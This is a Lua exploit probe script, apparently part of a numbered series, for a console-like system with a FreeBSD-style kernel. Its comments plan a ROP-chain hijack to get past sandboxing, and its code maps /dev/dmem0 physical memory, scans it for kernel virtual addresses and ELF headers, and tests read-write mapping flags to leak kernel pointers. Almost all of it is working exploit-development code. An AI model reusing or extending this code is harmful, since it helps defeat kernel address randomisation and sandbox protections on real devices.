-- CRASH_CLASS: MODERATE (ropchain manipulation + syscall redirection)
-- PROBE 42g: use ropchain hijack to leak kernel pointers
--
-- Strategy: The loader's ropchain executes syscalls by writing args
-- into heap slots, then pivoting to a call stub. We can:
-- 1. Find the ropchain (same as 41z)
-- 2. Locate the argument slots and fn_addr
-- 3. Set up a sysctl call that reads kernel process info
--    (kern.proc.all or kern.proc.pid with our PID)
-- 4. The key: we bypass the Lua-level syscall.resolve() which may
--    be where sandbox filtering happens
--
-- Actually, 42a already showed that raw make_syscall(202) works for
-- sysctl but returns scrubbed data. The sandbox is in the kernel.
--
-- NEW APPROACH: Use the ropchain to call functions OTHER than syscall:
-- - Call dlsym-equivalent to resolve internal libkernel functions
-- - Call pipe(2) and then read the kernel pipe struct via /proc or sysctl
-- - Or: call mmap with dmem0 fd at SPECIFIC physical offsets where
--   kernel data structures live
--
-- SIMPLEST: the data at phys 0 (0x80000000C0012800) looks like a
-- pointer. Map more pages around it and decode what structure it is.
-- If it's a page table or descriptor table, we can find kernel VA.
--
-- APPROACH: Map a large region starting from phys 0 and scan for
-- kernel virtual address patterns (0xFFFF8xxx_xxxxxxxx).

print("=== PROBE 42g: PHYSICAL MEMORY DEEP SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_getpid = make_syscall(20)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

local function dev_open(path)
    local name_buf = memory.alloc(256)
    for i = 1, #path do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #path, 0) end)
    local fd = nil
    pcall(function() fd = sc_open(name_buf, uint64(2), uint64(0)) end)
    return fd and to_num(fd) or -1
end

local dmem_fd = dev_open("/dev/dmem0")
print("dmem0 fd: " .. dmem_fd)
if dmem_fd < 0 then print("FAILED"); return end

--------------------------------------------------------------------
-- STEP 1: Map a large region at phys 0 and scan for kernel ptrs
-- 42f2 showed phys 0 has data. Map 1MB and look for patterns.
--------------------------------------------------------------------
print("")
print("--- STEP 1: DEEP SCAN PHYS 0 ---")

local scan_sizes = {0x4000, 0x10000, 0x40000, 0x100000}

for _, sz in ipairs(scan_sizes) do
    local addr = nil
    local ok = pcall(function()
        addr = sc_mmap(uint64(0), uint64(sz), uint64(1),
            uint64(1), uint64(dmem_fd), uint64(0))
    end)

    if ok and addr then
        local _, ah, al = qw_hex(addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            -- Count kernel pointers and interesting values
            local kptrs = 0
            local nonzero = 0
            local first_kptr = nil
            local elf_found = false

            for off = 0, sz - 8, 8 do
                local q = safe_rq(addr + off)
                if q then
                    local _, qh, ql = qw_hex(q)
                    if qh > 0 or ql > 0 then
                        nonzero = nonzero + 1
                    end
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then
                        kptrs = kptrs + 1
                        if kptrs <= 5 then
                            print(string.format("  +0x%05X: %s KPTR", off, qw_hex(q)))
                        end
                        if not first_kptr then first_kptr = qw_hex(q) end
                    end
                    -- Check for ELF
                    if off % 4 == 0 then
                        local d = safe_rd(addr + off)
                        if d == 0x464C457F then
                            print(string.format("  +0x%05X: ELF HEADER ***", off))
                            elf_found = true
                        end
                    end
                end
            end

            print(string.format("  mmap(sz=0x%X): nonzero=%d kptrs=%d%s",
                sz, nonzero, kptrs, elf_found and " ELF!" or ""))

            pcall(function() sc_munmap(addr, uint64(sz)) end)

            if kptrs > 0 then break end
        else
            print(string.format("  mmap(sz=0x%X): MAP_FAILED", sz))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Try negative/high physical offsets
-- On x86, MMIO and DRAM might be at high physical addresses.
-- Try above 4GB where DRAM typically resides on modern systems.
--------------------------------------------------------------------
print("--- STEP 2: HIGH PHYSICAL ADDRESSES ---")

local high_offsets = {}
-- 4GB to 8GB in 256MB steps
for i = 0, 15 do
    high_offsets[#high_offsets + 1] = {
        hi = 1 + math.floor(i * 256 * MB / 0x100000000),
        lo = (i * 256 * MB) % 0x100000000,
        label = string.format("%dGB+%dMB", 4 + math.floor(i*256/1024), (i*256)%1024)
    }
end
-- Also try specific addresses: 0x100000000 (4GB), 0x180000000 (6GB)
-- These are where DRAM often starts on systems with >4GB

for _, off in ipairs(high_offsets) do
    local off_u64 = uint64(string.format("0x%X%08X", off.hi, off.lo))
    local addr = nil
    local ok = pcall(function()
        addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), off_u64)
    end)

    if ok and addr then
        local _, ah, al = qw_hex(addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            local d0 = safe_rd(addr)
            local d4 = safe_rd(addr + 4)
            if d0 ~= nil and (d0 ~= 0 or (d4 and d4 ~= 0)) then
                local tag = ""
                if d0 == 0x464C457F then tag = " *** ELF ***" end
                -- Check for kernel ptr in first qword
                local q = safe_rq(addr)
                if q then
                    local _, qh, _ = qw_hex(q)
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then
                        tag = tag .. " KPTR!"
                    end
                end
                print(string.format("  %s (0x%X%08X): %08X_%08X%s",
                    off.label, off.hi, off.lo, d4 or 0, d0, tag))
            end
            pcall(function() sc_munmap(addr, uint64(0x4000)) end)
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Decode what's at physical 0
-- The value 0x80000000C0012800 at phys 0 is interesting:
-- Bit 63 set = likely a present page table entry or hardware reg
-- 0xC0012800 looks like a physical address (PCI MMIO range?)
-- Dump the first 256 bytes as both qwords and scan for patterns
--------------------------------------------------------------------
print("--- STEP 3: PHYS 0 DECODE ---")

local addr = nil
pcall(function()
    addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(dmem_fd), uint64(0))
end)

if addr then
    local _, ah, al = qw_hex(addr)
    if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
        print("first 256 bytes at phys 0:")
        for off = 0, 0xF8, 8 do
            local q = safe_rq(addr + off)
            if q then
                local hex, qh, ql = qw_hex(q)
                local tag = ""
                if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then tag = " KPTR" end
                if qh == 0x80000000 or qh == 0x80000001 then tag = " PTE?" end
                if ql == 0 and qh == 0 then tag = " zero" end
                print(string.format("  +0x%02X: %s%s", off, hex, tag))
            end
        end
        pcall(function() sc_munmap(addr, uint64(0x4000)) end)
    end
end
print("")

--------------------------------------------------------------------
-- STEP 4: Try mmap with PROT_READ|PROT_WRITE (3) instead of
-- just PROT_READ (1) — and try MAP_SHARED (1) vs MAP_PRIVATE (2)
-- Also try different dmem ioctls to allocate memory first
--------------------------------------------------------------------
print("--- STEP 4: ALTERNATE MMAP FLAGS ---")

local flag_combos = {
    {prot=1, flags=1, label="RD+SHARED"},
    {prot=1, flags=2, label="RD+PRIVATE"},
    {prot=3, flags=1, label="RW+SHARED"},
    {prot=3, flags=2, label="RW+PRIVATE"},
    {prot=3, flags=0x1002, label="RW+SHARED+ANON"},
}

for _, fc in ipairs(flag_combos) do
    local test_addr = nil
    local ok = pcall(function()
        test_addr = sc_mmap(uint64(0), uint64(0x4000), uint64(fc.prot),
            uint64(fc.flags), uint64(dmem_fd), uint64(0x4000))
    end)
    if ok and test_addr then
        local _, ah, al = qw_hex(test_addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            local d0 = safe_rd(test_addr)
            print(string.format("  %s at off 0x4000: mapped! data=0x%08X",
                fc.label, d0 or 0))
            pcall(function() sc_munmap(test_addr, uint64(0x4000)) end)
        else
            print(string.format("  %s at off 0x4000: MAP_FAILED", fc.label))
        end
    else
        print(string.format("  %s at off 0x4000: error", fc.label))
    end
end

pcall(function() sc_close(uint64(dmem_fd)) end)

print("")
print("=== PROBE 42g COMPLETE ===")
